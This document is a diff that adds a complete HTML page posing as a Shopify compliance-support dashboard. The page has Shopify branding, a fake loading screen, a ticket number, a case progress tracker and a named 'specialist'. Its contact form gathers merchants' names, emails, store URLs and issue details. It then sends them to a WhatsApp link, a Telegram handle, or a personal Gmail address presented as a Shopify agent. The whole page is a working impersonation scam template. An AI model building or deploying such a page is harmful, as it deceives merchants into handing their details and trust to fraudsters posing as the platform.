@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Shopify Compliance — Advisor Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer"/>
+  <style>
+    :root{
+      --green:#008060; --teal:#004c3f; --muted:#6b7280; --border:#e6e7ea; --bg:#f8fafb;
+    }
+    body{background:var(--bg);color:#0f172a}
+    .focus-ring:focus{outline:none;box-shadow:0 0 0 4px rgba(0,128,96,.12)}
+    .step{display:flex;align-items:center;gap:.75rem}
+    .step-dot{width:36px;height:36px;border-radius:9999px;display:inline-flex;align-items:center;justify-content:center;border:1px solid var(--border);background:#fff}
+    .step-dot.active{background:var(--green);color:white;border-color:var(--green)}
+    .step-line{height:2px;background:var(--border);flex:1}
+    .step-line.active{background:var(--green)}
+    .card{background:white;border:1px solid var(--border);border-radius:12px}
+  </style>
+</head>
+<body class="font-sans antialiased">
+
+  <!-- Loading -->
+  <section id="loading" class="min-h-screen flex items-center justify-center">
+    <div class="max-w-xl w-full p-6 text-center">
+      <img src="https://cdn.shopify.com/assets/images/logos/shopify-bag.png" class="mx-auto h-14 mb-4" alt="Shopify"/>
+      <h1 class="text-2xl font-semibold">Connecting you with a Compliance Specialist</h1>
+      <p class="text-sm text-[var(--muted)] mt-2">Preparing your secure session — this takes a moment.</p>
+      <div class="relative mx-auto mt-8 w-28 h-28">
+        <div class="w-28 h-28 rounded-full border-4 border-gray-200"></div>
+        <div class="absolute inset-0 rounded-full border-4 border-[var(--green)] border-t-transparent animate-spin"></div>
+        <div id="pct" class="absolute inset-0 flex items-center justify-center font-medium text-gray-700">0%</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Dashboard -->
+  <main id="dashboard" class="hidden max-w-6xl mx-auto py-10 px-6">
+    <header class="mb-6 flex items-center justify-between">
+      <div class="flex items-center gap-4">
+        <img src="https://cdn.shopify.com/assets/images/logos/shopify-bag.png" alt="Shopify" class="h-9"/>
+        <div>
+          <div class="text-lg font-semibold">Compliance Advisor</div>
+          <div class="text-sm text-[var(--muted)]">Secure case handling & merchant support</div>
+        </div>
+      </div>
+      <div class="text-sm inline-flex items-center gap-2 px-3 py-1 rounded-full bg-green-50 text-green-700"> 
+        <i class="fa-solid fa-circle text-[8px]"></i> Connected
+      </div>
+    </header>
+
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+      <!-- Left column -->
+      <aside class="card p-6">
+        <div class="flex items-center gap-4">
+          <div class="w-16 h-16 rounded-full bg-gradient-to-br from-[var(--teal)] to-[var(--green)] text-white flex items-center justify-center text-xl font-semibold">JM</div>
+          <div>
+            <div class="text-lg font-semibold">Juan Manuel</div>
+            <div class="text-sm text-[var(--muted)]">Shopify Compliance Specialist</div>
+          </div>
+        </div>
+
+        <p class="text-sm text-[var(--muted)] mt-4">Resolving compliance, payments and security issues. Please share case details to proceed.</p>
+
+        <div class="mt-6 grid gap-3">
+          <button onclick="openForm('whatsapp')" class="w-full inline-flex items-center justify-center gap-3 bg-[var(--green)] text-white py-2.5 rounded-md focus-ring">
+            <i class="fa-brands fa-whatsapp"></i><span>Contact via WhatsApp</span>
+          </button>
+          <button onclick="openForm('telegram')" class="w-full inline-flex items-center justify-center gap-3 bg-[var(--teal)] text-white py-2.5 rounded-md focus-ring">
+            <i class="fa-brands fa-telegram"></i><span>Contact via Telegram</span>
+          </button>
+          <button onclick="openForm('email')" class="w-full inline-flex items-center justify-center gap-3 bg-gray-800 text-white py-2.5 rounded-md focus-ring">
+            <i class="fa-solid fa-envelope"></i><span>Contact via Email</span>
+          </button>
+        </div>
+
+        <div class="mt-6">
+          <h4 class="text-sm font-medium text-gray-700">Advisor stats</h4>
+          <div class="mt-2 text-sm text-[var(--muted)]">Expert • 5+ years • Rating 4.9/5</div>
+        </div>
+      </aside>
+
+      <!-- Right column -->
+      <section class="lg:col-span-2 space-y-6">
+        <div class="card p-6">
+          <div class="flex items-start justify-between">
+            <div>
+              <div class="text-sm text-[var(--muted)]">Ticket</div>
+              <div class="text-xl font-semibold">#MA02-2097</div>
+            </div>
+            <div class="text-sm text-[var(--muted)]">
+              <div>Partner ID: <span class="font-medium">3855889</span></div>
+              <div class="mt-1">Status: <span class="text-green-700 font-medium">Active</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card p-6">
+          <div class="flex items-center justify-between mb-3">
+            <h3 class="font-semibold">Case Progress</h3>
+            <div id="progressLabel" class="text-sm text-[var(--muted)]">Step 2 of 4</div>
+          </div>
+          <div class="flex items-center gap-4">
+            <div class="step"><div id="dot-1" class="step-dot">1</div><div class="text-sm ml-2">Case Created</div></div>
+            <div id="line-1" class="step-line"></div>
+            <div class="step"><div id="dot-2" class="step-dot">2</div><div class="text-sm ml-2">Advisor Assigned</div></div>
+            <div id="line-2" class="step-line"></div>
+            <div class="step"><div id="dot-3" class="step-dot">3</div><div class="text-sm ml-2">Pending Review</div></div>
+            <div id="line-3" class="step-line"></div>
+            <div class="step"><div id="dot-4" class="step-dot">4</div><div class="text-sm ml-2">Active</div></div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <!-- Modal -->
+  <div id="modal" class="fixed inset-0 hidden items-center justify-center z-50 modal">
+    <div class="bg-white w-full max-w-2xl rounded-lg p-6 card">
+      <div class="flex items-start justify-between">
+        <div>
+          <h3 class="text-lg font-semibold">Contact Advisor</h3>
+          <div class="text-sm text-[var(--muted)]">Ticket <span id="ticketRef" class="font-medium">#MA02-2097</span></div>
+        </div>
+        <button aria-label="Close" onclick="closeForm()" class="text-gray-500 hover:text-gray-800"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+
+      <form id="contactForm" class="mt-4 space-y-4" onsubmit="handleSubmit(event)">
+        <input type="hidden" id="methodField" />
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div>
+            <label class="block text-sm text-gray-700">Ticket ID</label>
+            <input id="ticketInput" type="text" value="#MA02-2097" readonly class="w-full border border-[var(--border)] rounded-md px-3 py-2 bg-gray-50 text-sm" />
+          </div>
+          <div>
+            <label class="block text-sm text-gray-700">Store URL</label>
+            <input id="storeInput" type="url" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" placeholder="https://yourstore.myshopify.com" />
+          </div>
+          <div>
+            <label class="block text-sm text-gray-700">Email address</label>
+            <input id="emailInput" type="email" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" placeholder="you@example.com" />
+          </div>
+          <div>
+            <label class="block text-sm text-gray-700">Issue type</label>
+            <select id="issueInput" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm">
+              <option value="">Select an issue</option>
+              <option>Compliance Warning</option>
+              <option>Checkout or Payment Issues</option>
+              <option>Store Visibility / SEO</option>
+              <option>Security or Fraud</option>
+              <option>Other</option>
+            </select>
+          </div>
+        </div>
+
+        <div>
+          <label class="block text-sm text-gray-700">Your name</label>
+          <input id="nameInput" type="text" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" />
+        </div>
+        <div>
+          <label class="block text-sm text-gray-700">Message</label>
+          <textarea id="messageInput" rows="4" required class="w-full border border-[var(--border)] rounded-md px-3 py-2 focus-ring text-sm" placeholder="Summary of the issue..."></textarea>
+        </div>
+
+        <div class="flex items-center justify-end gap-3">
+          <button type="button" onclick="closeForm()" class="px-4 py-2 rounded-md border">Cancel</button>
+          <button id="submitBtn" type="submit" class="px-4 py-2 rounded-md bg-[var(--green)] text-white inline-flex items-center gap-2">
+            <span class="label">Submit</span>
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    const loading = document.getElementById('loading');
+    const dashboard = document.getElementById('dashboard');
+    const pct = document.getElementById('pct');
+    let value = 0;
+    const t = setInterval(()=>{
+      value = Math.min(100, value + Math.floor(Math.random()*7)+3);
+      pct.textContent = value + '%';
+      if(value>=100){
+        clearInterval(t);
+        loading.classList.add('hidden');
+        dashboard.classList.remove('hidden');
+        initStepper(2);
+      }
+    },110);
+
+    function initStepper(current){
+      const total = 4;
+      for(let i=1;i<=total;i++){
+        const dot = document.getElementById('dot-'+i);
+        if(i<=current){ dot.classList.add('active'); }
+        else{ dot.classList.remove('active'); }
+        const ln = document.getElementById('line-'+i);
+        if(ln){ if(i<current){ ln.classList.add('active'); } else{ ln.classList.remove('active'); } }
+      }
+      document.getElementById('progressLabel').textContent = `Step ${current} of ${total}`;
+    }
+
+    const modal = document.getElementById('modal');
+    const methodField = document.getElementById('methodField');
+    const ticketRef = document.getElementById('ticketRef');
+    const ticketInput = document.getElementById('ticketInput');
+
+    function openForm(method){
+      methodField.value = method;
+      ticketRef.textContent = ticketInput.value; 
+      document.getElementById('contactForm').classList.remove('hidden');
+      document.querySelector('#submitBtn .label').textContent = 'Submit';
+      modal.classList.remove('hidden'); modal.classList.add('flex');
+    }
+    function closeForm(){
+      modal.classList.add('hidden'); modal.classList.remove('flex');
+      document.getElementById('contactForm').reset();
+    }
+
+    function handleSubmit(e){
+      e.preventDefault();
+
+      const method = document.getElementById('methodField').value;
+      const store = document.getElementById('storeInput').value;
+      const email = document.getElementById('emailInput').value;
+      const issue = document.getElementById('issueInput').value;
+      const name = document.getElementById('nameInput').value;
+      const message = document.getElementById('messageInput').value;
+
+      const text = encodeURIComponent(
+        `New Support Request\n\n` +
+        `Name: ${name}\n` +
+        `Email: ${email}\n` +
+        `Store: ${store}\n` +
+        `Issue: ${issue}\n\n` +
+        `${message}`
+      );
+
+      let url = "";
+      if (method === "whatsapp") {
+        url = `https://wa.me/message/GSSL2RLHSQHDE1?text=${text}`;
+      } else if (method === "telegram") {
+        url = `https://t.me/merchanthelpsupport?text=${text}`;
+      } else if (method === "email") {
+        url = `mailto:juan.shopifyagent@gmail.com?subject=New Support Request&body=${text}`;
+      }
+
+      window.open(url, "_blank");
+      closeForm();
+    }
+  </script>
+</body>
+</html>
